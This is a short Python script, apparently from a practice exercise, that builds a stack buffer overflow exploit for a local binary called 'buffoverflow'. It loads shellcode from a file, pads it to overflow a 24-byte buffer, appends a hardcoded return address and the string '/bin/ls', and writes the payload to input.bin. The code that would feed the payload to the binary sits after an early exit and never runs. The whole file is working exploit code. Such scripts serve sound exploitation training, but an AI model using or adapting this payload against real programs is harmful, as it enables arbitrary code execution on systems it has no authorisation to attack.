#!/usr/bin/python

import subprocess
import pathlib

if __name__ == "__main__":
    bin = subprocess.Popen(["./buffoverflow"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)

    shell = pathlib.Path("shell").read_bytes()
    buffer = (
        b"A"
        + shell
        + b"A" * (24 - len(shell) - 1)
        + b"\x51\xd5\xff\xff\xff\x7f\x00\x00"
        + b"/bin/ls"
    )

    print(buffer)
    pathlib.Path("input.bin").write_bytes(buffer)
    exit(0)

    print(bin.stdin.write(buffer))

    out, err = bin.communicate()
    print(out, err)
